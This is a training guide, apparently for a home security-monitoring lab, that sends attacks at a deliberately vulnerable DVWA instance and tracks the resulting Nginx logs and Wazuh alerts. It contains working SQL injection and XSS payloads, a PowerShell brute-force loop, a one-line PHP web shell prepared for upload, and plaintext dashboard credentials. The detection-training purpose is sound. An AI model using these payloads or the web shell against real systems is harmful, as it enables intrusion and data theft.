# Mini SOC - Attack Testing & Log Monitoring Guide

Panduan lengkap untuk melakukan attack testing dan monitoring logs di Mini SOC.

---

## 📊 System Architecture

```
┌─────────────────────────────────────────────────┐
│  Attacker                                       │
│  (Your Computer)                                │
└────────────────────┬────────────────────────────┘
                     │ HTTP Requests
                     ▼
┌─────────────────────────────────────────────────┐
│  DVWA (Vulnerable Web App)                      │
│  Port: 8080                                     │
│  URL: http://localhost:8080                     │
└────────────────────┬────────────────────────────┘
                     │ Access Logs
                     ▼
┌─────────────────────────────────────────────────┐
│  Nginx Reverse Proxy                            │
│  Port: 80                                       │
│  Logs: /var/log/nginx/access.log                │
└────────────────────┬────────────────────────────┘
                     │ Log Shipping
                     ▼
┌─────────────────────────────────────────────────┐
│  Filebeat                                       │
│  Collects logs & sends to Wazuh                 │
└────────────────────┬────────────────────────────┘
                     │ Sends to Manager Port 1514
                     ▼
┌─────────────────────────────────────────────────┐
│  Wazuh Manager                                  │
│  Port: 55000 (API)                              │
│  Analyzes logs and generates alerts             │
└────────────────────┬────────────────────────────┘
                     │ Indexes to Elasticsearch
                     ▼
┌─────────────────────────────────────────────────┐
│  Wazuh Indexer (Elasticsearch)                  │
│  Port: 9200                                     │
│  Stores alerts & events                         │
└────────────────────┬────────────────────────────┘
                     │ Data Source
                     ▼
┌─────────────────────────────────────────────────┐
│  Wazuh Dashboard                                │
│  Port: 5601                                     │
│  URL: http://localhost:5601                     │
│  Visualizes alerts & logs                       │
└─────────────────────────────────────────────────┘
```

---

## 🎯 Attack Types & Payloads

### 1️⃣ SQL Injection (SQLi)

#### Method 1: Manual Attack via Browser
1. Open: `http://localhost:8080/vulnerabilities/sqli/`
2. Di field "User ID", masukkan:
   ```
   admin' OR '1'='1
   ```
3. Click "Submit"
4. Lihat response yang memberikan error atau data unauthorized

#### Method 2: Command Line Attack (Windows PowerShell)
```powershell
# SQLi - Authentication Bypass
$payload = "admin' OR '1'='1"
$encoded = [System.Web.HttpUtility]::UrlEncode($payload)
Invoke-WebRequest "http://localhost:8080/vulnerabilities/sqli/?id=$encoded"

# SQLi - UNION-based
$payload2 = "1' UNION SELECT user(),database() --"
$encoded2 = [System.Web.HttpUtility]::UrlEncode($payload2)
Invoke-WebRequest "http://localhost:8080/vulnerabilities/sqli/?id=$encoded2"
```

#### Expected Log Pattern
```
GET /vulnerabilities/sqli/?id=admin%27%20OR%20%271%27%3D%271 HTTP/1.1
200 OK
```

---

### 2️⃣ Cross-Site Scripting (XSS)

#### Method 1: Manual Attack via Browser
1. Open: `http://localhost:8080/vulnerabilities/xss_reflected/`
2. Di field "Name", masukkan:
   ```
   <script>alert('XSS Attack')</script>
   ```
3. Click "Submit"
4. Browser akan menampilkan alert (tapi ini dictionary lab)

#### Method 2: Command Line Attack
```powershell
$payload = "<script>alert('XSS')</script>"
$encoded = [System.Web.HttpUtility]::UrlEncode($payload)
Invoke-WebRequest "http://localhost:8080/vulnerabilities/xss_reflected/?name=$encoded"
```

#### Payload Variations
```html
<!-- Simple Script -->
<script>alert('XSS')</script>

<!-- Event Handler -->
<img src=x onerror=alert('XSS')>

<!-- SVG Vector -->
<svg onload=alert('XSS')>

<!-- Cookie Stealer Pattern -->
<script>alert(document.cookie)</script>
```

---

### 3️⃣ Brute Force Attack

#### Method 1: Manual - Multiple Login Attempts
```powershell
# Try multiple password attempts
for ($i = 1; $i -le 5; $i++) {
    $password = "password$i"
    Invoke-WebRequest `
      -Uri "http://localhost:8080/vulnerabilities/brute/" `
      -Method POST `
      -Body "username=admin&password=$password&Login=Login" `
      -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 1
}
```

#### Expected Result
Multiple 401/403 responses indicating failed login attempts

---

### 4️⃣ File Upload Attack

#### Method 1: Upload Malicious File
```powershell
# Create a test file
@"
<?php system($_GET['cmd']); ?>
"@ | Out-File -FilePath "shell.php" -Encoding ASCII

# Try to upload (if form supports file upload)
# Manual browser: http://localhost:8080/vulnerabilities/upload/
```

---

## 📋 How to Run Pre-built Attack Script

### Option 1: On Linux/WSL
```bash
# Make it executable
chmod +x attack.sh

# Run the script
./attack.sh

# Select attack option (1-5)
# 1 = SQL Injection
# 2 = XSS
# 3 = File Upload
# 4 = Brute Force
# 5 = All Attacks
```

### Option 2: On Windows (Manual PowerShell Script)
I'll create a Windows batch script that you can run directly.

---

## 🔍 Monitoring & Viewing Logs

### Option 1: Real-time Docker Logs

#### View All Container Logs
```bash
docker compose logs -f
```

#### View Specific Container
```bash
# Wazuh Manager logs
docker compose logs -f wazuh-manager

# Nginx access logs
docker compose logs -f nginx

# Filebeat logs
docker compose logs -f filebeat

# Wazuh Indexer
docker compose logs -f wazuh-indexer
```

### Option 2: Inside Container Logs

#### View Nginx Access Logs (Real-time)
```bash
docker compose exec nginx tail -f /var/log/nginx/access.log
```

#### View Wazuh Alerts (Real-time)
```bash
docker compose exec wazuh-manager tail -f /var/ossec/logs/alerts/alerts.json
```

#### View Wazuh Manager Logs
```bash
docker compose exec wazuh-manager tail -f /var/ossec/logs/ossec.log
```

#### View Filebeat Status
```bash
docker compose exec filebeat cat /var/log/filebeat/filebeat
```

---

## 📊 Viewing Logs via Wazuh Dashboard

### Step 1: Access Dashboard
- URL: `http://localhost:5601`
- Username: `admin`
- Password: `SecurePassword123!`

### Step 2: Navigate to Alerts
1. Click **Modules** → **Security Events**
2. You'll see all alerts from Wazuh Manager

### Step 3: Filter Alerts
- By Rule ID (100100 for SQLi, 100200 for XSS)
- By Source IP
- By Attack Type
- By Severity Level

### Step 4: View Alert Details
- Click on any alert
- See:
  - Source IP
  - Destination
  - Payload
  - Rule matched
  - Severity
  - Log source

---

## 🚀 Complete Attack Testing Workflow

### Step 1: Prepare Terminal (Open 3 Windows)

**Terminal 1 - Monitor Nginx Logs:**
```bash
docker compose logs -f nginx
```

**Terminal 2 - Monitor Wazuh Manager:**
```bash
docker compose logs -f wazuh-manager
```

**Terminal 3 - Execute Attacks:**
```bash
# Ready to run attack commands
```

### Step 2: Run First Attack
```powershell
# Execute SQLi attack
$payload = "admin' OR '1'='1"
$encoded = [System.Web.HttpUtility]::UrlEncode($payload)
Invoke-WebRequest "http://localhost:8080/vulnerabilities/sqli/?id=$encoded" -ErrorAction SilentlyContinue
```

### Step 3: Observe in Terminal 1 (Nginx)
You'll see:
```
127.0.0.1 - - [25/Apr/2026:10:35:20 +0000] "GET /vulnerabilities/sqli/?id=admin%27%20OR%20%271%27%3D%271 HTTP/1.1" 200 1523 "-" "Mozilla/5.0..."
```

### Step 4: Check Wazuh Manager Terminal 2
After a few seconds, you'll see:
```
2026/04/25 10:35:22 wazuh-analysisd: INFO: (1307): Following branch: 100100.
2026/04/25 10:35:22 wazuh-analysisd: INFO: Generated alert: (Rule: 100100) -> SQLi Attack Detected
```

### Step 5: View in Wazuh Dashboard
1. Wait 10-15 seconds
2. Open http://localhost:5601
3. Go to **Security Events**
4. You'll see the alert with:
   - Rule ID: 100100
   - Alert Level: HIGH
   - Description: SQL Injection Attack Detected
   - Full HTTP request details

---

## 📈 Attack Testing Scenarios

### Scenario 1: Single SQLi Attack
```
Time: ~30 seconds
Events Generated:
- 1 HTTP Request (Nginx)
- 1 Alert (Wazuh)
- Expected Rule ID: 100100

Logs to Check:
1. Nginx access.log → HTTP request
2. Wazuh alerts.json → Alert details
3. Dashboard → Visualize alert
```

### Scenario 2: Multiple Attacks (5 SQLi)
```
Time: ~2 minutes (with delays)
Events Generated:
- 5 HTTP Requests
- 5 Alerts
- Pattern visible in Dashboard

Logs to Check:
1. Nginx → Multiple requests in 1 minute
2. Wazuh → 5 alerts with same rule ID
3. Dashboard → Trend analysis
```

### Scenario 3: Mixed Attacks (SQLi + XSS + Brute Force)
```
Time: ~5 minutes
Events Generated:
- 3 different request types
- Multiple rule IDs triggered
- Complex incident timeline

Shows:
- How SOC correlates different attack types
- How alerts are prioritized
- How to track attack origin/pattern
```

---

## 🔧 Quick Command Reference

### Attack Execution (PowerShell)
```powershell
# SQLi
$SQL = "admin' OR '1'='1"
Invoke-WebRequest "http://localhost:8080/vulnerabilities/sqli/?id=$([System.Web.HttpUtility]::UrlEncode($SQL))"

# XSS
$XSS = "<script>alert('XSS')</script>"
Invoke-WebRequest "http://localhost:8080/vulnerabilities/xss_reflected/?name=$([System.Web.HttpUtility]::UrlEncode($XSS))"
```

### Log Monitoring (Docker)
```bash
# All logs
docker compose logs -f

# Nginx only (Attack origin)
docker compose logs -f nginx

# Wazuh only (Alert generation)
docker compose logs -f wazuh-manager

# Real logs inside container
docker compose exec wazuh-manager tail -f /var/ossec/logs/alerts/alerts.json

# Check Filebeat connectivity
docker compose logs filebeat --tail 20
```

### Dashboard Access
- URL: http://localhost:5601
- Credentials: `admin` / `SecurePassword123!`
- Module: Security Events

---

## ⏱️ Expected Timeline

```
T+0s:   Execute attack command
T+1s:   HTTP request hits DVWA
T+2s:   Nginx logs the request
T+3s:   Filebeat picks up log
T+4s:   Filebeat sends to Wazuh Manager
T+5s:   Wazuh analyzes and matches rule
T+6s:   Alert generated in alerts.json
T+8s:   Alert indexed to Elasticsearch
T+10s:  Alert visible in Dashboard
```

---

## 📝 Log File Locations

| Log Type | Container | Path |
|----------|-----------|------|
| Nginx Access | nginx | `/var/log/nginx/access.log` |
| Wazuh Alerts | wazuh-manager | `/var/ossec/logs/alerts/alerts.json` |
| Wazuh Manager | wazuh-manager | `/var/ossec/logs/ossec.log` |
| Filebeat | filebeat | `/var/log/filebeat/filebeat` |
| Wazuh API | wazuh-manager | `/var/ossec/logs/api.log` |

---

## 🎓 What You'll Learn

1. **Attack-to-Alert Pipeline**: See real attack generate alerts
2. **Log Correlation**: Understand how logs connect
3. **SIEM Analysis**: See how Wazuh processes security events
4. **Incident Response**: Track attacks from detection to analysis
5. **Dashboard Usage**: Real-time security monitoring

---

## 💡 Tips

1. **Start Small**: Do 1 SQLi attack first, understand the flow
2. **Monitor in Real-time**: Use 3 terminals side-by-side
3. **Wait Between Attacks**: 5-10 seconds for logs to propagate
4. **Check Dashboard**: Best way to see correlated results
5. **Use Multiple Attacks**: See how patterns are detected

---

**Happy Testing! 🛡️**
